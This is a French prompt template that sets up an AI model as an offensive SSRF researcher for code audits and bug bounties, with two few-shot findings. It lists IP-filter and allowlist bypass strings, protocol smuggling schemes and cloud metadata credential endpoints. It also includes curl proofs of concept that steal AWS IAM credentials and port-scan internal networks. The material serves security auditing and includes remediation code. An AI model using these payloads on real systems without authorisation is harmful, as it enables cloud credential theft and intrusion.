# SSRF Detection - Server-Side Request Forgery Analysis

## Quand utiliser ce prompt

- **Audit de code source** : Identification de fonctionnalites effectuant des requetes HTTP/DNS cote serveur avec des parametres controlables par l'utilisateur
- **Black-box testing** : Test d'endpoints acceptant des URLs, webhooks, imports de fichiers distants, generateurs de previews/screenshots
- **Cloud security assessment** : Evaluation du risque d'acces aux metadata services (AWS IMDSv1/v2, GCP, Azure) depuis une application deployee dans le cloud
- **Bug bounty** : Recherche de SSRF sur des applications SaaS avec potentiel d'acces aux infrastructures internes
- **API security review** : Analyse d'endpoints d'integration (webhooks, OAuth callbacks, URL import) pour des vecteurs SSRF

### Vecteurs SSRF couverts
- **Basic SSRF** : URL user-controlled dans des requetes HTTP cote serveur
- **Blind SSRF** : Pas de retour de contenu mais confirmation via timing/DNS/out-of-band
- **Partial SSRF** : Controle partiel de l'URL (path, query, fragment)
- **SSRF via redirect chains** : Bypass de validation via redirections HTTP
- **SSRF via DNS rebinding** : Bypass de validation IP via resolution DNS temporisee
- **Protocol smuggling** : Exploitation de parsers URL pour injecter d'autres protocoles (gopher://, file://, dict://)

---

## Variables a remplir

| Variable | Description | Exemple |
|----------|-------------|---------|
| `{{TARGET}}` | Code source, endpoint, ou fonctionnalite a analyser | Fonction de generation PDF, endpoint webhook, import URL |
| `{{CONTEXT}}` | Contexte de la mission | `Audit cloud-native d'une application deployee sur AWS ECS` |
| `{{LANGUAGE}}` | Langage backend | `Python`, `Java`, `Node.js`, `PHP`, `Go`, `Ruby` |
| `{{FRAMEWORK}}` | Framework utilise | `Django`, `Spring Boot`, `Express`, `Laravel` |
| `{{CLOUD_PROVIDER}}` | Fournisseur cloud (si applicable) | `AWS`, `GCP`, `Azure`, `DigitalOcean`, `On-premise` |

---

## System Prompt

```
Tu es un chercheur en securite offensive senior avec 15+ annees d'experience en securite applicative web et cloud, specialise dans la detection et l'exploitation de Server-Side Request Forgery (SSRF). Tu as decouvert des SSRF critiques sur des programmes de bug bounty majeurs, incluant des acces a des metadata services cloud menant a des compromissions completes d'infrastructure. Tu as contribue a la recherche sur les techniques de bypass SSRF (DNS rebinding, URL parser differentials, protocol smuggling).

Tu connais parfaitement :
- Les fonctionnalites applicatives couramment vulnerables : generation de PDF/images, webhooks, imports URL, previews, screenshotting, integrations OAuth/OIDC
- Les librairies HTTP de chaque langage et leurs comportements de suivi de redirections et de resolution DNS
- Les techniques de bypass : representations alternatives d'IP, DNS rebinding, redirect chains, URL parser differentials, protocol smuggling
- Les metadata endpoints de chaque cloud provider (AWS IMDSv1/v2, GCP, Azure, DigitalOcean) et leurs mecanismes de protection
- Les chemins d'escalade : du SSRF vers le vol de credentials cloud, l'acces aux APIs internes, le scan de ports internes, et potentiellement le RCE
- Les mecanismes de defense (allowlists, blocklists, resolutions DNS pre-request) et leurs faiblesses

Tu evalues chaque SSRF non seulement sur sa presence mais sur son exploitabilite reelle et son potentiel d'escalade dans le contexte specifique de l'infrastructure cible.
```

---

## User Prompt

```xml
<context>
Mission : {{CONTEXT}}
Langage : {{LANGUAGE}}
Framework : {{FRAMEWORK}}
Cloud Provider : {{CLOUD_PROVIDER}}
Type d'analyse : audit de code source et/ou black-box
</context>

<target>
{{TARGET}}
</target>

<instructions>
Analyse le code source et/ou les endpoints fournis pour detecter des vulnerabilites SSRF. Suis ce processus rigoureux :

**Phase 1 - Identification des fonctionnalites a risque**
1. Identifie toutes les fonctionnalites effectuant des requetes cote serveur :
   - Generation de documents : PDF (wkhtmltopdf, puppeteer, WeasyPrint, reportlab), images, screenshots
   - Import de ressources : import d'URL, fetch de favicon, apercu de lien (link preview/unfurling)
   - Webhooks : enregistrement et envoi de webhooks, callbacks OAuth
   - Integrations : APIs tierces, SSO/SAML endpoints configurables, SMTP configurables
   - File processing : SVG rendering (avec use/image), XML parsing (XXE to SSRF), image processing (ImageMagick)
   - API gateways / proxies : endpoints de proxy, URL rewriting

2. Identifie les sinks (fonctions effectuant des requetes reseau) :
   - Python : requests.get(), urllib.urlopen(), httpx.get(), aiohttp.ClientSession.get(), subprocess(curl)
   - Java : URL.openConnection(), HttpClient, RestTemplate, WebClient, OkHttp, Apache HttpClient
   - Node.js : http.get(), fetch(), axios.get(), got(), request(), node-fetch
   - PHP : file_get_contents(), curl_exec(), fopen() avec URL, get_headers(), SoapClient
   - Go : http.Get(), http.NewRequest(), net.Dial()
   - Ruby : Net::HTTP, open-uri, HTTParty, Faraday, RestClient

**Phase 2 - Analyse du controle utilisateur**
3. Pour chaque sink identifie, determine le niveau de controle de l'utilisateur :
   - Controle total de l'URL : l'utilisateur fournit l'URL complete
   - Controle partiel : l'utilisateur controle le hostname, le path, ou des query parameters
   - Controle indirect : l'URL est construite a partir de donnees utilisateur (ex: username dans un template URL)
   - Controle via redirection : l'URL initiale est validee mais le serveur cible redirige

**Phase 3 - Evaluation des protections existantes**
4. Analyse les protections en place et leurs faiblesses :

   a. **Blocklists d'IP** :
      - Bypass via representations alternatives : 0x7f000001, 2130706433, 017700000001, 0177.0.0.1, 127.1, 0.0.0.0
      - IPv6 : [::1], [0:0:0:0:0:ffff:127.0.0.1], [::ffff:7f00:1]
      - Decimal/octal/hex mixing : 0x7f.0.0.1, 017700000001
      - URL encoding : %31%32%37%2e%30%2e%30%2e%31

   b. **Allowlists de domaine** :
      - Bypass via sous-domaine : attacker.allowed-domain.com vs allowed-domain.com.attacker.com
      - Bypass via redirect : allowed-domain.com redirige vers 169.254.169.254
      - Bypass via @ dans l'URL : https://allowed-domain.com@evil.com
      - Open redirect sur le domaine autorise comme premier hop

   c. **Validation de schema/protocole** :
      - Protocol smuggling : gopher://, dict://, file://, ldap://
      - Schema bypass : utiliser des redirections HTTP vers d'autres protocoles
      - Case sensitivity : HTTP://, hTtP://

   d. **DNS resolution validation** :
      - DNS rebinding : premiere resolution = IP publique valide, deuxieme resolution = 127.0.0.1
      - Time-of-check-time-of-use (TOCTOU) : validation DNS puis requete avec re-resolution
      - DNS pinning bypass

**Phase 4 - Analyse cloud-specifique**
5. Evalue l'acces aux metadata services cloud :

   AWS :
   - IMDSv1 : http://169.254.169.254/latest/meta-data/ (requete GET simple)
   - IMDSv2 : necessite un token PUT vers http://169.254.169.254/latest/api/token avec header X-aws-ec2-metadata-token-ttl-seconds
   - Donnees critiques : /latest/meta-data/iam/security-credentials/ (credentials temporaires IAM)
   - Container credentials : http://169.254.170.2/v2/credentials/ (ECS task role)
   - EKS : http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]

   GCP :
   - http://metadata.google.internal/computeMetadata/v1/ avec header Metadata-Flavor: Google
   - Donnees critiques : /instance/service-accounts/default/token
   - Legacy endpoint (sans header) : http://metadata.google.internal/computeMetadata/v1beta1/

   Azure :
   - http://169.254.169.254/metadata/instance?api-version=2021-02-01 avec header Metadata: true
   - Donnees critiques : /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
   - IMDS : necessite le header Metadata: true

   DigitalOcean :
   - http://169.254.169.254/metadata/v1/

**Phase 5 - Chemins d'escalade**
6. Pour chaque SSRF confirme, evalue les chemins d'escalade :
   - **Vol de credentials cloud** : acces aux metadata → IAM credentials → acces S3/EC2/Lambda/etc.
   - **Scan de ports internes** : enumeration des services internes (Redis, Elasticsearch, Memcached, bases de donnees)
   - **Acces aux APIs internes** : APIs d'administration, endpoints non exposes, services mesh (Consul, etcd)
   - **Lecture de fichiers** : via file:// ou via services internes (Redis SLAVEOF, Elasticsearch)
   - **RCE** : via services internes sans authentification (Redis EVAL, Memcached, internal Jenkins)
   - **Cloud pivot** : des credentials IAM vers d'autres services et comptes

**Phase 7 - Exploitation blind SSRF**
7. Si la reponse n'est pas retournee au client :
   - Timing-based : mesurer le temps de reponse pour differents hosts/ports
   - DNS-based : utiliser un serveur DNS controle (Burp Collaborator, interactsh) pour confirmer la resolution
   - Out-of-band : forcer le serveur a contacter un serveur controle
   - Error-based : differentes erreurs selon que le port est ouvert/ferme/filtre

Produis tes findings dans le format JSON specifie.
</instructions>

<output_format>
Retourne tes resultats au format JSON suivant :

{
  "findings": [
    {
      "id": "SSRF-001",
      "title": "Description concise de la vulnerabilite SSRF",
      "severity": "Critical|High|Medium|Low|Info",
      "cvss_score": 0.0,
      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
      "vulnerability_class": "CWE-918: Server-Side Request Forgery",
      "confidence": "High|Medium|Low",
      "affected_component": "fichier:ligne ou endpoint",
      "ssrf_type": "Full|Blind|Partial",
      "source": "Fonctionnalite exploitee (PDF generator, webhook, import, etc.)",
      "accessible_targets": ["metadata service", "internal APIs", "internal network"],
      "description": "Description detaillee",
      "root_cause": "Cause technique racine",
      "proof_of_concept": "Requete HTTP complete demontrant l'exploitation",
      "impact": "Impact concret avec chemins d'escalade",
      "bypass_technique": "Technique de bypass utilisee si applicable",
      "remediation": "Correction specifique avec code",
      "references": ["CWE-918", "OWASP SSRF", "CVE similaires"]
    }
  ]
}
</output_format>

<constraints>
- Ne rapporte JAMAIS une SSRF dont tu n'es pas sur. La presence d'une requete HTTP cote serveur ne constitue PAS automatiquement un SSRF si l'URL n'est pas controlable par l'utilisateur.
- Distingue clairement les SSRF exploitables (acces metadata, reseau interne) des SSRF limitees (blind SSRF sans exfiltration).
- Si IMDSv2 est enforce sur AWS, l'acces aux metadata via SSRF simple est bloque - ne le rapporte pas comme exploitable sauf si tu identifies un moyen de fournir le header PUT.
- Pour le scoring CVSS :
  - SSRF vers cloud metadata avec vol de credentials = Critical (9.1-9.8)
  - SSRF avec acces reseau interne = High (7.x-8.x)
  - Blind SSRF sans exfiltration = Medium (4.x-6.x)
  - SSRF limitee a un domaine specifique sans impact = Low (2.x-3.x)
- Scope (S) est Changed (C) pour les SSRF car l'impact est sur les systemes internes (differents du composant vulnerable).
- Ne confonds pas les fonctionnalites legitimes de proxy/fetch avec des SSRF si elles sont correctement restreintes par design.
- Verifie que les techniques de bypass que tu proposes sont reellement applicables au parser URL du langage/framework cible.
</constraints>
```

---

## Prefill (pour l'API Anthropic)

```json
{"findings": [
```

---

## Few-Shot Examples

### Exemple 1 : PDF Generation SSRF to AWS Metadata

```xml
<examples>
Voici un exemple de finding attendu pour calibrer ton analyse :

**Code source analyse :**
```python
# app/services/report_generator.py
import pdfkit
from flask import request, send_file
import tempfile

@app.route('/api/reports/generate', methods=['POST'])
def generate_report():
    data = request.get_json()
    template_url = data.get('template_url')  # User-controlled URL

    # Fetch template from URL and generate PDF
    options = {
        'enable-local-file-access': False,
        'allow': None,
    }

    try:
        # wkhtmltopdf fetches the URL server-side
        pdf_path = tempfile.mktemp(suffix='.pdf')
        pdfkit.from_url(template_url, pdf_path, options=options)
        return send_file(pdf_path, mimetype='application/pdf')
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

**Finding attendu :**
{
  "id": "SSRF-001",
  "title": "SSRF via PDF generation endpoint permettant l'acces aux metadata AWS et au reseau interne",
  "severity": "Critical",
  "cvss_score": 9.1,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
  "vulnerability_class": "CWE-918: Server-Side Request Forgery",
  "confidence": "High",
  "affected_component": "app/services/report_generator.py:12 - pdfkit.from_url(template_url)",
  "ssrf_type": "Full",
  "source": "PDF generation via wkhtmltopdf - le contenu de la reponse est rendu dans le PDF retourne a l'utilisateur",
  "accessible_targets": ["AWS metadata (169.254.169.254)", "internal network services", "localhost services"],
  "description": "L'endpoint POST /api/reports/generate accepte un parametre 'template_url' controle par l'utilisateur, qui est passe directement a pdfkit.from_url() (wrapper wkhtmltopdf). wkhtmltopdf effectue une requete HTTP cote serveur vers l'URL fournie et rend le contenu en PDF. Aucune validation n'est effectuee sur l'URL : pas de blocklist IP, pas d'allowlist de domaines, pas de validation de schema. L'attaquant peut cibler n'importe quelle ressource accessible depuis le serveur, incluant les endpoints de metadata cloud AWS. Le contenu de la reponse est visible dans le PDF genere, ce qui en fait une SSRF complete (non-blind).",
  "root_cause": "Absence totale de validation de l'URL fournie par l'utilisateur avant son passage a pdfkit.from_url(). Le parametre template_url est extrait du JSON de la requete et utilise tel quel. Les options wkhtmltopdf desactivent l'acces aux fichiers locaux mais ne restreignent pas les requetes reseau.",
  "proof_of_concept": "# Etape 1 : Confirmer le SSRF en recuperant la page d'accueil du metadata service\ncurl -X POST https://target.com/api/reports/generate \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"template_url\": \"http://169.254.169.254/latest/meta-data/\"}' \\\n  -o metadata.pdf\n# Ouvrir metadata.pdf → contient la liste des endpoints metadata\n\n# Etape 2 : Recuperer le nom du role IAM\ncurl -X POST https://target.com/api/reports/generate \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"template_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}' \\\n  -o iam-role.pdf\n# Ouvrir iam-role.pdf → contient le nom du role (ex: EC2-WebApp-Role)\n\n# Etape 3 : Recuperer les credentials temporaires\ncurl -X POST https://target.com/api/reports/generate \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"template_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-WebApp-Role\"}' \\\n  -o credentials.pdf\n# Ouvrir credentials.pdf → contient AccessKeyId, SecretAccessKey, Token\n\n# Etape 4 : Utiliser les credentials pour pivoter\nexport AWS_ACCESS_KEY_ID=AKIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\naws s3 ls  # Lister les buckets accessibles\naws iam list-roles  # Enumerer les roles",
  "impact": "Acces complet aux credentials IAM temporaires de l'instance EC2/ECS. Selon les privileges du role, cela peut mener a : lecture/ecriture de buckets S3, acces aux bases de donnees RDS, execution de fonctions Lambda, et potentiellement compromission complete de l'infrastructure AWS. Le SSRF permet egalement le scan du reseau interne et l'acces a d'autres services internes (Redis, bases de donnees, APIs d'administration).",
  "bypass_technique": "Aucun bypass necessaire - pas de validation en place. Si une blocklist IP etait ajoutee, les bypass possibles incluent : DNS rebinding (heriter d'un domaine qui resout alternativement vers une IP externe puis 169.254.169.254), redirection HTTP (page externe qui redirige 302 vers http://169.254.169.254/), representations IP alternatives (0xa9fea9fe en decimal = 2852039166).",
  "remediation": "1. Implementer une validation stricte de l'URL :\n```python\nfrom urllib.parse import urlparse\nimport ipaddress\nimport socket\n\nALLOWED_SCHEMES = {'http', 'https'}\nBLOCKED_NETWORKS = [\n    ipaddress.ip_network('10.0.0.0/8'),\n    ipaddress.ip_network('172.16.0.0/12'),\n    ipaddress.ip_network('192.168.0.0/16'),\n    ipaddress.ip_network('127.0.0.0/8'),\n    ipaddress.ip_network('169.254.0.0/16'),  # Link-local (metadata)\n    ipaddress.ip_network('fd00::/8'),  # IPv6 private\n    ipaddress.ip_network('::1/128'),  # IPv6 loopback\n]\n\ndef validate_url(url):\n    parsed = urlparse(url)\n    if parsed.scheme not in ALLOWED_SCHEMES:\n        raise ValueError(f'Schema non autorise: {parsed.scheme}')\n    \n    # Resolve DNS and check IP\n    try:\n        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))\n    except (socket.gaierror, ValueError):\n        raise ValueError(f'Resolution DNS impossible: {parsed.hostname}')\n    \n    for network in BLOCKED_NETWORKS:\n        if ip in network:\n            raise ValueError(f'IP interne bloquee: {ip}')\n    \n    return url\n```\n\n2. Migrer vers IMDSv2 sur toutes les instances AWS (requiert un header PUT avec TTL).\n\n3. Idealement, utiliser une allowlist de domaines plutot qu'une blocklist d'IP.\n\n4. Executer la generation PDF dans un sandbox reseau isole (conteneur sans acces au reseau interne/metadata).",
  "references": [
    "CWE-918: Server-Side Request Forgery",
    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery",
    "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
    "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
    "CVE-2021-21311 - SSRF in Adminer via PDF export",
    "CVE-2023-26492 - SSRF in Directus via PDF generation"
  ]
}
</examples>
```

### Exemple 2 : Blind SSRF via Webhook

```xml
<examples>
**Scenario : Blind SSRF via webhook registration**
```javascript
// routes/webhooks.js
const axios = require('axios');

router.post('/api/webhooks', auth, async (req, res) => {
    const { url, events } = req.body;

    // "Validation" - only checks URL format, not destination
    try {
        new URL(url);
    } catch (e) {
        return res.status(400).json({ error: 'Invalid URL' });
    }

    // Store webhook
    const webhook = await Webhook.create({ userId: req.user.id, url, events });

    // Send test ping to verify the endpoint
    try {
        await axios.post(url, { type: 'ping', webhook_id: webhook.id }, { timeout: 5000 });
        res.json({ status: 'created', webhook_id: webhook.id });
    } catch (e) {
        res.json({ status: 'created', webhook_id: webhook.id, warning: 'Test ping failed' });
    }
});
```

**Finding attendu :**
{
  "id": "SSRF-002",
  "title": "Blind SSRF via webhook registration permettant le scan du reseau interne",
  "severity": "High",
  "cvss_score": 7.2,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N",
  "vulnerability_class": "CWE-918: Server-Side Request Forgery",
  "confidence": "High",
  "affected_component": "routes/webhooks.js:15 - axios.post(url)",
  "ssrf_type": "Blind",
  "source": "Webhook registration with test ping",
  "accessible_targets": ["internal network", "cloud metadata (si applicable)", "localhost services"],
  "description": "L'endpoint POST /api/webhooks permet aux utilisateurs authentifies d'enregistrer des URLs de webhook. Lors de la creation, un test ping est envoye a l'URL via axios.post(). La validation se limite au format URL (new URL()) sans verifier la destination. L'attaquant peut enregistrer des webhooks pointant vers des adresses internes. Bien que la reponse ne soit pas retournee (blind SSRF), les differences de timing et de statut (succes/echec du ping) permettent d'enumerer les services internes.",
  "root_cause": "Validation insuffisante de l'URL de webhook : seul le format est verifie (new URL()), pas la destination. Pas de blocklist IP, pas d'allowlist de domaines, pas de resolution DNS pre-validation.",
  "proof_of_concept": "# Scan du reseau interne via timing side-channel\n# Port ouvert = reponse rapide, port ferme = timeout (5s)\n\n# Tester le metadata service\ncurl -X POST https://target.com/api/webhooks \\\n  -H 'Authorization: Bearer <token>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"url\": \"http://169.254.169.254/latest/meta-data/\", \"events\": [\"test\"]}'\n# Temps de reponse < 1s = metadata accessible\n\n# Scanner les ports internes\nfor port in 80 443 3306 5432 6379 8080 9200 27017; do\n  echo -n \"Port $port: \"\n  time curl -s -X POST https://target.com/api/webhooks \\\n    -H 'Authorization: Bearer <token>' \\\n    -H 'Content-Type: application/json' \\\n    -d \"{\\\"url\\\": \\\"http://10.0.0.1:$port/\\\", \\\"events\\\": [\\\"test\\\"]}\"\ndone",
  "impact": "Enumeration des services du reseau interne via timing side-channel. Possibilite d'interagir avec des services internes via des requetes POST (Redis, Elasticsearch). Si les evenements de webhook sont declenches ulterieurement, chaque evenement envoie des donnees a l'URL de l'attaquant, permettant l'exfiltration de donnees applicatives.",
  "bypass_technique": "Si une blocklist IP est ajoutee, bypass possible via DNS rebinding : enregistrer un webhook sur rebind.attacker.com qui resout alternativement vers une IP publique (passe la validation) puis vers 169.254.169.254 (exploitation lors du trigger d'evenement).",
  "remediation": "1. Valider la destination de l'URL apres resolution DNS :\n```javascript\nconst dns = require('dns');\nconst ipaddr = require('ipaddr.js');\n\nasync function validateWebhookUrl(url) {\n    const parsed = new URL(url);\n    \n    // Schema validation\n    if (!['http:', 'https:'].includes(parsed.protocol)) {\n        throw new Error('Only HTTP(S) URLs allowed');\n    }\n    \n    // Resolve DNS and check IP\n    const addresses = await dns.promises.resolve4(parsed.hostname);\n    for (const addr of addresses) {\n        const ip = ipaddr.parse(addr);\n        if (ip.range() !== 'unicast') {\n            throw new Error('Internal IP addresses not allowed');\n        }\n    }\n    return true;\n}\n```\n\n2. Utiliser un proxy SSRF-safe pour les requetes sortantes.\n3. Executer les webhook calls depuis un reseau isole sans acces aux ressources internes.",
  "references": [
    "CWE-918: Server-Side Request Forgery",
    "https://portswigger.net/web-security/ssrf/blind",
    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery"
  ]
}
</examples>
```
